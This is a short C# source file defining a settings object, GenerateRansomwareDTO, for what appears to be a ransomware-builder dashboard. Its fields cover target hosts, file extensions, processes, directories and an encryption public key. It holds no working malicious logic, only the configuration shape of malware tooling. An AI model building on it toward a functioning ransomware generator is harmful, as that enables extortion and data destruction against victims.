using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace BaphoDashBoard.DTO
{
    public class GenerateRansomwareDTO
    {
        [JsonProperty("name")]
        public string Name { get; set; }

        [JsonProperty("description")]
        public string Description { get; set; }

        [JsonProperty("hosts")]
        public string Hosts { get; set; }

        [JsonProperty("hosts_list")]
        public ArrayList HostsList = new ArrayList();

        [JsonProperty("extensions")]
        public string Extensions { get; set; }

        [JsonProperty("extensions_list")]
        public ArrayList ExtensionsList = new ArrayList();

        [JsonProperty("processes")]
        public string Processes { get; set; }

        [JsonProperty("processes_list")]
        public ArrayList ProcessesList = new ArrayList();

        [JsonProperty("dirs")]
        public string Dirs { get; set; }

        [JsonProperty("dirs_list")]
        public ArrayList DirsList = new ArrayList();

        [JsonProperty("publickey")]
        public string PublicKey { get; set; }
    }
}
